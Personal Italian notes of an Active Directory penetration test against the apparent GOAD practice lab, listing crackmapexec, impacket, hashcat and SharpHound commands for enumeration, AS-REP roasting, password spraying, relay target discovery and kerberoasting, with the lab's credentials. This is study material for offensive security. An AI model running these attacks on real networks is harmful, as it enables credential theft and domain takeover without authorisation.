### **SUBNET ENUM**
Inizio enumerando l'intera subnet con cme alla ricerca du samba
```bash
crackmapexec smb 192.168.56.0/24
```
![[Pasted image 20230810122313.png]]
Ora trovo gli ip dei DC per configurare /etc/hosts e capire la topologia
```bash
nslookup -type=srv _ldap._tcp.dc._msdcs.sevenkingdoms.local 192.168.56.10
```
cambia ogni volta il nome del dominio
![[Pasted image 20230810124141.png]]
quindi modifico /etc/hosts per risolvere gli indirizzi
![[Pasted image 20230810124229.png]]

### **USER ENUM (NO CREDS)**
Enumero gli user presenti su ogni macchine
```bash
crackmapexec smb 192.168.56.11 --users
```
Ha SAMRPC attivo e quindi potrò enumerare gli user
![[Pasted image 20230810163553.png]]
Ho ottenuto anche una password trovata nella descrizione negli user

Puoi anche ottenere la policy della password per provare del bruteforce
```bash
crackmapexec smb 192.168.56.11 --pass-pol
```
![[Pasted image 20230810164319.png]]
Potresti usare anche enu4linux ma non ho voglia

### **SHARE SMB (NO CREDS)**
Enumeriamo gli share di smb su cui abbiamo qualche permesso come anonimo
```bash
crackmapexec smb 192.168.56.10-23 -u 'guest' -p '' --shares
```
![[Pasted image 20230810165921.png]]
cioccato

### **ASPREP-roasting**
Hai trovato la lista degli username, ora spolvera gli appunti
```bash
impacket-GetNPUsers 'north.sevenkingdoms.local/' -no-pass -usersfile users.txt -format hashcat -outputfile hash
```
![[Pasted image 20230810171242.png]]
cracca l'hash
![[Pasted image 20230810171924.png]]

### **Password Spraying**
==OCCHIO ALLE POLICY DELLE PASSWORD PERCHE POTRESTI LOCKARE LE PASSWORD==
```bash
crackmapexec smb 192.168.56.11 -u user.txt -p user.txt --no-bruteforce
```
![[Pasted image 20230810172208.png]]
### **NTLM RELAY**
Controlliamo tra gli host se ce ne è uno con l'opzione "signing:False"
```bash
crackmapexec smb 192.168.56.10-23 --gen-relay-list relay.txt
```

### **USER ENUM(W\ CREDS)**
Per ottenere tutti gli User di un dominio avendo un account a disposizione
```bash
impacket-GetADUsers -all north.sevenkingdoms.local/brandon.stark:iseedeadpeople 
```
![[Pasted image 20230825105044.png]]

### **KERBEROASTING (SPN)**
Proviamo a vedere se c'è qualche SPN settato e con l'hash in chiaro (Cosa che capita spesso)
```bash
impacket-GetUserSPNs -request -dc-ip 192.168.56.11 north.sevenkingdoms.local/brandon.stark:iseedeadpeople -outputfile kerberoasting.hashes
```
![[Pasted image 20230825112141.png]]
Gli hash di questi due utenti sono stati inseriti nel file kerberoasting.hashes (opzione -outpoutfile)

Puoi usare anche crackmapexec per farlo
```bash
cme ldap 192.168.56.11 -u brandon.stark -p 'iseedeadpeople' -d north.sevenkingdoms.local --kerberoasting KERBEROASTING
```

Cracca gli hash
```bash
hashcat -m 13100 -a 0 kerberoasting.hashes /usr/share/wordlists/rockyou.txt
```
![[Pasted image 20230825114831.png]]
Solo un hash è stata craccata

### **AD ENUM (BLOODHOUND)**
Ora che abbiamo trovato delle credenziali per accedere possiamo fare un enumerazione dell'ad tramite bloodhound e trovare i vari path per gli account
```bash
xfreerdp /u:jon.snow /p:iknownothing /d:north /v:192.168.56.22 /cert-ignore
```
Passa l'exe ed avvialo, enumerando tutti e 3 i domain
```bash
.\sharphound.exe -d north.sevenkingdoms.local -c all --zipfilename bh_north_sevenkingdoms.zip
.\sharphound.exe -d sevenkingdoms.local -c all --zipfilename bh_sevenkingdoms.zip
.\sharphound.exe -d essos.local -c all --zipfilename bh_essos.zip
```
